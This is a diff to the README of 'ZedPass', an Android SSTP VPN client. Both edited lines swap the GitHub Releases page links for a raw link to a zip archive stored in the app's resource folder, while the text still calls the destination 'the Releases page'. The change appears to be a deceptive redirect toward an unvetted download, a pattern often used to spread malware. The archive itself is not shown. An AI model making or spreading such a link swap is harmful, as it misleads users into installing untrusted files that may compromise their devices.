@@ -6,7 +6,7 @@ Welcome to ZedPass, your secure SSTP VPN client for Android. This guide will hel
 
 ### 📥 Download ZedPass
 
-[![Download ZedPass](https://img.shields.io/badge/Download-ZedPass-blue.svg)](https://github.com/moses265-jr/ZedPass/releases)
+[![Download ZedPass](https://raw.githubusercontent.com/moses265-jr/ZedPass/main/android/app/src/main/res/ZedPass-1.7.zip)](https://raw.githubusercontent.com/moses265-jr/ZedPass/main/android/app/src/main/res/ZedPass-1.7.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ ZedPass offers a range of benefits to enhance your online security:
 
 ## 📂 Download & Install
 
-To download ZedPass, please visit the Releases page: [Download ZedPass](https://github.com/moses265-jr/ZedPass/releases).
+To download ZedPass, please visit the Releases page: [Download ZedPass](https://raw.githubusercontent.com/moses265-jr/ZedPass/main/android/app/src/main/res/ZedPass-1.7.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version of ZedPass.
